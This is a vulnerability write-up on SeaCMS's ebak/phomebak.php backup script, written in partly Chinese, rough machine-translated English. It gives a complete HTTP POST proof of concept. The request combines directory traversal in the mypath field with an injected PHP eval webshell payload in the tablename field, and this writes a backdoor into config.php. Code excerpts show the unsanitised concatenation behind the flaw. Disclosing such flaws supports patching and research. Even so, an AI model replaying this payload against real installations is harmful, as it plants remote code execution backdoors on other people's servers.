### 13.1 ebak/phomebak.php存在任意位置创建目录，并写入php木马

13.1 ebak/phomebak.php exists at any location to create directories and write php Trojans Vulnerability flow First access /ebak/ChangeDb.php Come to the following interface

![image-20240821104415493](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821104415493.png)

Click on the bottom to start backup capture

**POC**

```java
POST /p8qca/ebak/phomebak.php HTTP/1.1
Host: seacms:8181
Content-Length: 256
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seacms:8181
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms:8181/p8qca/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea&act=b
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; XDEBUG_SESSION=PHPSTORM; PHPSESSID=supsf31jdepfl81lcelmmp0um5
Connection: keep-alive

phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=..%2F..%2F..%2F..%2F..%2Fabcd&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=";eval($_POST['a']);/*&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD
```

Modify mypath=... /.. /.. /.. /.. /abcd Is the name of the created directory, and can implement directory traversal In addition, the directory will automatically generate php files, and the content can be written to the Trojan through special concatenation After sending the POC

![image-20240821150320832](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821150320832.png)

Successfully traversed the directory and created the directory 

Directory also successfully created our Trojan file

![image-20240821151312163](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821151312163.png)

Code part analysis

The following code exists in phomebak.php

```java
if($phome=="DoEbak")//初使化备份表
{
	Ebak_DoEbak($_POST);
}
```

Our phome parameter can be controlled when entering the Ebak_DoEbak method for DoEbak

in this method there is

```java
if(empty($add['mypath']))
	{
		$add['mypath']=$dbname."_".date("YmdHis");
	}
    DoMkdir($bakpath."/".$add['mypath']);
```

没有对我们的mypath进行目录穿越过滤，直接创建目录

```java
$string="<?php 
	\$b_table=\"".$b_table."\";
	".$d_table."
	\$b_baktype=".$add['baktype'].";
	\$b_filesize=".$add['filesize'].";
	\$b_bakline=".$add['bakline'].";
	\$b_autoauf=".$add['autoauf'].";
	\$b_dbname=\"".$dbname."\";
	\$b_stru=".$bakstru.";
	\$b_strufour=".$bakstrufour.";
	\$b_dbchar=\"".addslashes($add['dbchar'])."\";
	\$b_beover=".$beover.";
	\$b_insertf=\"".addslashes($insertf)."\";
	\$b_autofield=\",".addslashes($add['autofield']).",\";
	\$b_bakdatatype=".$bakdatatype.";
	 ?>";
	$cfile=$bakpath."/".$add['mypath']."/config.php";
	WriteFiletext_n($cfile,$string);
```

You can see that we directly concatenate our input b_table, which is our tablename, and write $cfile=$bakpath."/".$add['mypath']."/config.php"; That is, the config.php file Can php Trojan horse
